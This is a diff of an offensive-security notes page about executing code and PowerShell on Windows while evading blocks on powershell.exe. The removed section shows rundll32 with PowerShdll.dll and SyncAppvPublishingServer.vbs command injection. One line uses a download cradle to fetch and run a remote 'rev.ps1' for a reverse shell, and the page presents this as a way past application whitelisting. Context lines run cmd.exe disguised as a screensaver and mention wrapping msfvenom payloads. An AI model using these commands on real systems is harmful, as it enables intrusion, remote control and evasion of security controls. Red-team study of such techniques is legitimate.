@@ -61,50 +61,6 @@ copy c:\windows\system32\cmd.exe c:\cmd.scr
 rundll32.exe desk.cpl,InstallScreenSaver c:\cmd.scr
 ```
 
-## <mark style="color:red;">Powershell without powershell.exe</mark>
-
-Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it.
-
-If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there are ways to execute powershell still.
-
-```
-rundll32.exe PowerShdll.dll,main
-```
-
-### <mark style="color:orange;">SyncAppvPublishingServer</mark>
-
-Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:
-
-```
-SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
-```
-
-example:
-
-#### <mark style="color:green;">getting a reverse shell with SyncAppvPublishingServer and powershell.</mark>
-
-generate a powershell payload and serve it on the network, use this command to call powershell from vba and load the payload in memory.
-
-```
-SyncAppvPublishingServer.vbs "Break; iex(new-object system.net.webclient).downloadstring('http://192.168.56.1/rev.ps1')"
-```
-
-{% hint style="info" %}
-#### This technique can easily bypass application whitelisting.
-{% endhint %}
-
-{% embed url="https://youtu.be/7tvfb9poTKg" %}
-
-{% embed url="https://github.com/p3nt4/PowerShdll" %}
-
-### <mark style="color:orange;">BYOPS</mark>
-
-#### Bring your own powershell, any application that can use the .Net DLL to execute powershell commands.
-
-{% embed url="https://github.com/leechristensen/UnmanagedPowerShell" %}
-
-{% embed url="https://github.com/bitsadmin/nopowershell" %}
-
 ## <mark style="color:red;">Using Payload Wrappers</mark>
 
 we can use various open source payload wrappers that add an extra layer to msfvenom payloads. not much of an FUD payload, but still effective.
